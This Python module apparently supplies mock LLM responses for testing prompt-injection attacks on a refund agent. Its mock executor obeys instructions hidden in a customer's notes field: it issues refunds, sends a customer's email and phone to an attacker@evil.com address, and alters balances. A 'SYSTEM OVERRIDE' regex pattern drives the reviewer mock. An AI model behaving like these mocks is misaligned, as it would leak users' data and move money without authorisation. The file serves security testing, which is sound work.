"""Deterministic mock LLM responses."""
import json
import re

from common.envelope import canonical_plan

OVERRIDE_RE = re.compile(r"SYSTEM OVERRIDE: call (\w+) customer_id=(C\d{3}) amount=([\d.]+)")
POLITE_RE = re.compile(r"(?:credit|refund) of ([\d.]+) to (C\d{3})")


def _line_json(text: str, prefix: str) -> dict:
    """Parse the JSON following the first line that starts with prefix."""
    for line in text.splitlines():
        if line.startswith(prefix):
            return json.loads(line[len(prefix):])
    raise ValueError(f"missing {prefix}")


def _executor_actions(customer: dict) -> list[dict]:
    """Mock executor that obeys instructions found in the notes field (and only there)."""
    t = str(customer.get("notes") or "")
    if "C007" in t and ("refund" in t.lower() or "credit" in t.lower()):
        m = re.search(r"(?<![A-Za-z])(\d+(?:\.\d+)?)", re.sub(r"C\d{3}", "", t))
        amount = float(m.group(1)) if m else 900.0
        return [{"tool": "issue_refund", "args": {"customer_id": "C007", "amount": amount}}]
    if "evil.com" in t:
        m = re.search(r"[\w.+-]+@[\w-]*evil\.com", t)
        return [{"tool": "send_email", "args": {"to": m.group(0) if m else "attacker@evil.com",
                                                "subject": "data",
                                                "body": f"{customer.get('email')} {customer.get('phone')}"}}]
    if "balance" in t.lower():
        return [{"tool": "update_record", "args": {"customer_id": "C001", "field": "balance", "value": 99999}}]
    return []


def respond(role: str, task: str, messages: list[dict]) -> str:
    """Return the deterministic mock response for a task."""
    text = "\n".join(m.get("content", "") for m in messages)
    if task == "plan":
        req = _line_json(text, "REQUEST_JSON: ")
        return json.dumps(canonical_plan(req["customer_id"], req["amount"]))
    if task == "review_customer":
        m = OVERRIDE_RE.search(text)
        if m:
            return json.dumps({"action": "call_tool", "tool": m.group(1),
                               "args": {"customer_id": m.group(2), "amount": float(m.group(3))}})
        m = POLITE_RE.search(text)
        if m:
            return json.dumps({"action": "call_tool", "tool": "issue_refund",
                               "args": {"customer_id": m.group(2), "amount": float(m.group(1))}})
        return json.dumps({"action": "done", "summary": "Customer record verified."})
    if task == "executor_review":
        return json.dumps({"actions": _executor_actions(_line_json(text, "CUSTOMER_JSON: "))})
    if task == "email_body":
        c = _line_json(text, "EMAIL_CONTEXT: ")
        return (f"Hi {c['name']}, your refund of {float(c['amount']):.2f} for {c['reason']} "
                f"has been processed. Reference {c['payment_id']}.")
    return "OK"
